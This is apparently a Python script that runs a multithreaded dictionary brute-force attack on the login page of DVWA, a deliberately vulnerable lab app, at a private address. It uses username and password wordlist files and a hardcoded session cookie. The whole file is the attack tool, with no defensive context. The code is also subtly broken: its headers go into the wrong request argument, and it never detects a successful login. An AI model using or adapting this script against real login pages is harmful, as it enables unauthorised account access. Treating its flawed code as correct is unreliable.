import threading
import requests

global user
global passwd
global url
global header


url    = "http://192.168.43.91/dvwa/login.php"
user   = []
passwd = []

def open_File():

        try:
                with open('user.txt','r') as u:
                        for i in u.readlines():
                                i = i.strip('\n')
                                user.append(i)
                with open('passwd.txt','r') as p:
                        for i in p.readlines():
                                i = i.strip('\n')
                                passwd.append(i)                           
                                
        except Exception as e:
                print (e)
                
        return


header = {
        'Host': '192.168.43.91',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0',
        'Referer': 'http://192.168.43.91/dvwa/login.php',
        'Cookie': 'security=high; PHPSESSID=fc8a4a82e577f91ad914fe5b1f3b65b3'       
}



def datas(username,password):
        data = {
                'username':username,
                'password':password,
                'Login':'Login'
        }
        return data



def pojie(user):
        
        for ps in passwd:
                data = datas(user,ps)
                re = requests.post(url,data,header)
                if len(user) % 12 :
                        user = user + ((12 - len(user)%12) * '-')
                if len(ps) % 12:
                        ps = ps + ((12 - len(ps)%12) * '-')
                print ("[*] user:{}--------- password:{}---------> {}".format(user,ps,re))
        
        return
                
        

open_File()

threads = []

for uu in user:
        t = threading.Thread(target=pojie,args=(uu,))
        t.start()
